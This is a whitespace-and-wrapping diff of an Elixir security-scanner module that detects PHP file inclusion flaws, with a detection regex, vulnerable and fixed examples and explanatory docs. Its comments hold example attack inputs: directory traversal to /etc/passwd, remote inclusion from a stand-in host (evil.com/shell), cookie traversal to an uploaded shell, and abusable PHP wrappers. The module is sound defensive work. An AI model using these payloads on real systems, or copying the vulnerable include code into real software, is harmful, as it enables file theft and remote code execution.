@@ -1,30 +1,30 @@
 defmodule Rsolv.Security.Patterns.Php.FileInclusion do
   @moduledoc """
   Pattern for detecting File Inclusion vulnerabilities in PHP.
-  
+
   This pattern identifies when user input is used to dynamically include files,
   which can lead to Local File Inclusion (LFI) or Remote File Inclusion (RFI)
   vulnerabilities. These are among the most critical vulnerabilities in PHP.
-  
+
   ## Vulnerability Details
-  
+
   File inclusion vulnerabilities occur when user-controlled input is used to
   specify which file to include using PHP's include/require functions. This can
   allow attackers to read sensitive files (LFI) or execute remote code (RFI).
-  
+
   ### Attack Example
   ```php
   // Vulnerable code
   include $_GET['page'] . '.php';
-  
+
   // LFI Attack: ?page=../../../../etc/passwd%00
   // RFI Attack: ?page=http://evil.com/shell
   ```
   """
-  
+
   use Rsolv.Security.Patterns.PatternBase
   alias Rsolv.Security.Pattern
-  
+
   @impl true
   def pattern do
     %Pattern{
@@ -34,7 +34,8 @@ defmodule Rsolv.Security.Patterns.Php.FileInclusion do
       type: :file_inclusion,
       severity: :critical,
       languages: ["php"],
-      regex: ~r/(include|require|include_once|require_once)\s*\(?\s*.*\$_(GET|POST|REQUEST|COOKIE)/,
+      regex:
+        ~r/(include|require|include_once|require_once)\s*\(?\s*.*\$_(GET|POST|REQUEST|COOKIE)/,
       cwe_id: "CWE-98",
       owasp_category: "A03:2021",
       recommendation: "Use a whitelist of allowed files or avoid dynamic inclusion",
@@ -53,7 +54,7 @@ if (in_array($page, $allowed)) {
       }
     }
   end
-  
+
   @impl true
   def vulnerability_metadata do
     %{
@@ -62,21 +63,22 @@ if (in_array($page, $allowed)) {
       They occur when user input is used to determine which file to include, potentially
       allowing attackers to include arbitrary files from the local filesystem (LFI) or
       even remote URLs (RFI).
-      
+
       Types of file inclusion attacks:
       - Local File Inclusion (LFI): Reading local files
       - Remote File Inclusion (RFI): Including remote malicious files
       - Directory Traversal: Using ../ to access files outside web root
       - PHP Filter Bypass: Using php://filter to read source code
       - Data Wrapper: Using data:// to inject code
-      
+
       The impact can range from information disclosure to complete system compromise.
       """,
       references: [
         %{
           type: :cwe,
           id: "CWE-98",
-          title: "Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')",
+          title:
+            "Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')",
           url: "https://cwe.mitre.org/data/definitions/98.html"
         },
         %{
@@ -159,7 +161,7 @@ if (in_array($page, $allowed)) {
       - All four inclusion functions: include, require, include_once, require_once
       - Both with and without parentheses syntax
       - User input from all superglobals
-      
+
       The pattern is designed to catch common inclusion patterns where
       user input directly influences which file is included.
       """,
@@ -197,12 +199,12 @@ if (in_array($page, $allowed)) {
       }
     }
   end
-  
+
   @doc """
   Returns test cases for the pattern.
-  
+
   ## Examples
-  
+
       iex> test_cases = Rsolv.Security.Patterns.Php.FileInclusion.test_cases()
       iex> length(test_cases.positive) > 0
       true
@@ -262,7 +264,7 @@ if (in_array($_GET['page'], $allowed)) {
       ]
     }
   end
-  
+
   @doc """
   Returns examples of vulnerable and fixed code.
   """
@@ -273,10 +275,10 @@ if (in_array($_GET['page'], $allowed)) {
         // Page loader - VULNERABLE to LFI
         $page = $_GET['page'];
         include($page . '.php');
-        
+
         // Attack: ?page=../../../../etc/passwd%00
         // Result: Displays system password file (PHP < 5.3.4)
-        
+
         // Attack: ?page=../config
         // Result: Includes config.php from parent directory
         """,
@@ -284,7 +286,7 @@ if (in_array($_GET['page'], $allowed)) {
         // Template system - VULNERABLE to LFI/RFI
         $template = $_GET['template'];
         include('templates/' . $template);
-        
+
         // LFI: ?template=../../../etc/passwd
         // RFI: ?template=http://evil.com/shell.txt (if allow_url_include=on)
         """,
@@ -292,7 +294,7 @@ if (in_array($_GET['page'], $allowed)) {
         // Multi-language support - VULNERABLE
         $lang = $_COOKIE['lang'];
         require_once("languages/$lang/strings.php");
-        
+
         // Attack: Cookie: lang=../../uploads/shell
         // Includes uploaded malicious file
         """
@@ -302,13 +304,13 @@ if (in_array($_GET['page'], $allowed)) {
         // Page loader - SECURE
         $allowed_pages = ['home', 'about', 'contact', 'products'];
         $page = $_GET['page'];
-        
+
         if (in_array($page, $allowed_pages)) {
             include("pages/{$page}.php");
         } else {
             include("pages/404.php");
         }
-        
+
         // Only predefined pages can be included
         """,
         "Path validation" => ~S"""
@@ -316,7 +318,7 @@ if (in_array($_GET['page'], $allowed)) {
         $template = basename($_GET['template']); // Remove directory components
         $template_path = realpath("templates/{$template}.php");
         $allowed_path = realpath("templates/");
-        
+
         // Ensure the resolved path is within templates directory
         if ($template_path && strpos($template_path, $allowed_path) === 0) {
             include($template_path);
@@ -341,7 +343,7 @@ if (in_array($_GET['page'], $allowed)) {
                 return false;
             }
         }
-        
+
         $router = new Router();
         if (!$router->route($_GET['page'])) {
             require_once('controllers/NotFoundController.php');
@@ -350,7 +352,7 @@ if (in_array($_GET['page'], $allowed)) {
       }
     }
   end
-  
+
   @doc """
   Returns detailed vulnerability description.
   """
@@ -359,62 +361,62 @@ if (in_array($_GET['page'], $allowed)) {
     File inclusion vulnerabilities are among the most dangerous security flaws in
     PHP applications. They allow attackers to include arbitrary files, potentially
     leading to source code disclosure, sensitive data exposure, or remote code execution.
-    
+
     ## Types of File Inclusion
-    
+
     ### Local File Inclusion (LFI)
-    
+
     LFI allows reading files from the local filesystem:
     ```php
     include($_GET['file']);  // ?file=../../../../etc/passwd
     ```
-    
+
     ### Remote File Inclusion (RFI)
-    
+
     RFI allows including files from remote servers:
     ```php
     include($_GET['url']);  // ?url=http://evil.com/shell.txt
     ```
-    
+
     RFI requires `allow_url_include=on` in php.ini (disabled by default).
-    
+
     ## Attack Techniques
-    
+
     ### Directory Traversal
     Using `../` to navigate directories:
     - `?page=../../../../etc/passwd`
     - `?file=../../../config/database.php`
-    
+
     ### PHP Wrappers
     PHP provides various wrappers that can be abused:
     - `php://filter` - Read source code
     - `php://input` - Include POST data
     - `data://` - Include inline data
     - `expect://` - Execute system commands
-    
+
     ### Null Byte Injection (Historical)
     In PHP < 5.3.4, null bytes could bypass file extension checks:
     - `?file=../../../etc/passwd%00.php`
-    
+
     ## Real-World Impact
-    
+
     1. **Information Disclosure**
        - Source code exposure
        - Configuration file access
        - Database credentials
-    
+
     2. **Remote Code Execution**
        - Including malicious uploaded files
        - RFI with remote shells
        - Log poisoning attacks
-    
+
     3. **Server Compromise**
        - Web shell installation
        - Privilege escalation
        - Lateral movement
-    
+
     ## Prevention Strategies
-    
+
     ### 1. Whitelist Approach
     ```php
     $allowed = ['home', 'about', 'contact'];
@@ -422,7 +424,7 @@ if (in_array($_GET['page'], $allowed)) {
         include $_GET['page'] . '.php';
     }
     ```
-    
+
     ### 2. Input Validation
     ```php
     $file = basename($_GET['file']);  // Remove path components
@@ -431,36 +433,36 @@ if (in_array($_GET['page'], $allowed)) {
         include $path;
     }
     ```
-    
+
     ### 3. Modern Architecture
     - Use MVC frameworks with proper routing
     - Implement autoloading for classes
     - Avoid dynamic file inclusion entirely
-    
+
     ## PHP Configuration
-    
+
     Critical php.ini settings:
     - `allow_url_include = off` - Prevents RFI
     - `open_basedir` - Restricts file access
     - `disable_functions` - Disable dangerous functions
-    
+
     ## Framework Protection
-    
+
     Modern PHP frameworks provide safe alternatives:
     - **Laravel**: Route definitions and controllers
     - **Symfony**: Service container and routing
     - **WordPress**: Template hierarchy system
-    
+
     File inclusion vulnerabilities are entirely preventable with proper
     input validation and modern development practices.
     """
   end
-  
+
   @doc """
   Returns AST enhancement rules to reduce false positives.
-  
+
   ## Examples
-  
+
       iex> enhancement = Rsolv.Security.Patterns.Php.FileInclusion.ast_enhancement()
       iex> Map.keys(enhancement) |> Enum.sort()
       [:ast_rules, :min_confidence]
